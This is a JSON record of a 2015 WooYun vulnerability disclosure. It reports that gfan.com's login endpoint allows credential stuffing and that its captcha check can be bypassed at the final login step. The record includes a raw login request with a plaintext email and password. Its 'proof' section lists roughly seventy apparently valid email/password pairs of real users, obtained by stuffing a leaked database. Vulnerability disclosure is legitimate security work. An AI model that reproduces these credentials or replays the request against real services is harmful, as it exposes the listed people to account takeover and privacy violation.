{"id": 33222, "wybug_id": "wooyun-2015-0109312", "wybug_title": "机锋某接口撞库泄露用户登录凭据(有批量账号证明)", "wybug_corp": "机锋网", "wybug_author": "路人甲", "wybug_date": "2015-04-21 10:40", "wybug_open_date": "2015-06-05 10:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["撞库"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向公众公开  简要描述： 撞库扫号攻击已经是Top 10 Security Risks for 2014之一.撞库以大量的用户数据为基础，利用用户相同的注册习惯（相同的用户名和密码），尝试登陆其它的网站。2011年，互联网泄密事件引爆了整个信息安全界，导致传统的用户+密码认证的方式已无法满足现有安全需求。泄露数据包括：天涯：31,758,468条，CSDN：6,428,559条，微博：4,442,915条，人人网：4,445,047条，猫扑：2,644,726条，178：9,072,819条，嘟嘟牛：13,891,418条，7K7K：18,282,404条，共1.2亿条。不管你的网站密码保护的多好，但是面对已经泄露的账号密码，撞库扫号防御还是一个相当重要的环节。 详细说明：      主站登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号主站登陆验证码绕过。验证码只在之前的一步有验证，最后登录的时候没有验证。。这逻辑写的。。。登录数据包如下：\nPOST /doLogin HTTP/1.1Host: my.gfan.comProxy-Connection: keep-aliveContent-Length: 108Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://my.gfan.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://my.gfan.com/login?returnUrl=http://www.gfan.com/index.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: RA-Ver: 2.9.0RA-Sid: 7B9DD012-20150303-080129-82895f-fb68a9AlexaToolbar-ALX_NS_PH: AlexaToolbar/alxg-3.3Connection: closegotoUrl=http%3A%2F%2Fwww.gfan.com%2Findex.php&loginName=zhangyajun131@163%2ecom&password=57529704&authCode=\n   漏洞证明：  经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.目前互联网上公开的账号都有数亿的规模，真要被利用的话危害还是很大的。\nlyyarq@yeah.net\t429131222wtzjw1112@163.com\twtzjw885281112zqdzly@tom.com\t12345678ls1277@qq.com\t19880818360412641@QQ.COM\t90281972375971709@qq.com\t83030545gwxarc@hotmail.com\t072324aaynliliang@gmail.com\tliliangSlp2433@qq.com\t369258174zhaoxiaofeng.888@163.com\t5991139989wujiang621@gmail.com\tsigon621dgnelf@163.com\tnishiwo20jackaly@21cn.com\t610054xqygym@126.com\txuqingyuzork@21cn.com\t123456c88@eyou.com\tchen1234toctory@263.net\t78524hjh_wz@126.com\thjhgm7679timath@sohu.com\t19831210dxl1a@126.com\tdxlzj0513tangxinghua100@qq.com\tsteers19841122zhwq3@163.com\t12334566sudy2k@gmail.com\t5b8w2pcksxycwn@sohu.com\twn19900809cwho@21cn.com\t65580321wzxjxp@gmail.com\tzjtzlhjsaken0820@126.com\t42142130999defendmidfield@sina.com\t983170heyu-998@163.com\t19821025hyhkqx23@126.com\t19850s23dpjyg@163.com\tfeidong7031xiyingze@gmail.com\t19841226frank@tekprene.com\ttekprenevickyngai@yahoo.com.hk\t92540819neverwj@163.com\twangjinghlightd@gmail.com\thoudong135245bkr2001@163.com\tbkr54127pft911@163.com\t19761113xdbd45@qq.com\t123456789yzbeizhi@nankai.edu.cn\tbingbingjin_chao@sina.com\tjco123wisdom@sina.com\twisdom73jxx_luck@sina.com\t800818jingxinyue_2000@126.com\t3249006xy_589@126.com\tx8182131yliuzhenghui0702@yahoo.com.cn\t69158089mxp33521@126.com\t959001112zw_wuhan@163.com\t79801314404113473@qq.com\t03281250xumeng_2004@163.com\t19800515heng19861229@163.com\theng1025416277460@qq.com\tccrr19880827764077118@qq.com\taaa123123zhl602418@163.com\t1988602418qiwu.zhang@gmail.com\tzqwzqwzqwwxy731@vip.qq.com\t62637736jy3204183@163.com\thjwisatcpilipaca@126.com\t85798579maik5918@yahoo.com.cn\t122545669liuyong19850202@163.com\ta121522434hao_1033286@163.com\t1033286haoyitiaojin135@126.com\t13166493747htlr@21cn.com\twangjiaxitony871018@126.com\ttony5212129hong890206@163.com\t8902061125liujian313712@163.com\tqq123456\n\n\n\n\n   修复方案：  撞库防御参考资料:http://stayliv3.github.io/2015/04/15/%E6%92%9E%E5%BA%93%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88/   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-04-21 10:46 厂商回复： 谢谢，修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-21 11:31 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  首页也打折，这是防刷rank的节奏么，不开心。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}